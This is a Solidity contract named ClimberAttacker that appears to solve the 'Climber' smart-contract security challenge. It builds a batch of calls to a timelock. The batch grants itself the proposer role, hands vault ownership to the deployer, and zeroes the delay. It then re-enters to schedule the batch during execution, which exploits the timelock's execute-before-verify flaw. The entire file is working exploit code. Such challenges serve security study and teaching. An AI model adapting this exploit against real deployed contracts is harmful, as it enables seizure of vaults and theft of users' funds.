// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract ClimberAttacker {
    address payable timelock;
    uint256[] _values = [0,0,0,0];
    address[] _targets = new address[](4);
    bytes[] _elements = new bytes[](4);
    bytes32 proposer = keccak256("PROPOSER_ROLE");


  constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _vault,_timelock, address(this)];

        _elements[0] = abi.encodeWithSignature("grantRole(bytes32,address)" ,proposer,address(this));
        _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets,_values,_elements,bytes32("anysalt"));
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets,_values,_elements,bytes32("anysalt"));
    }
}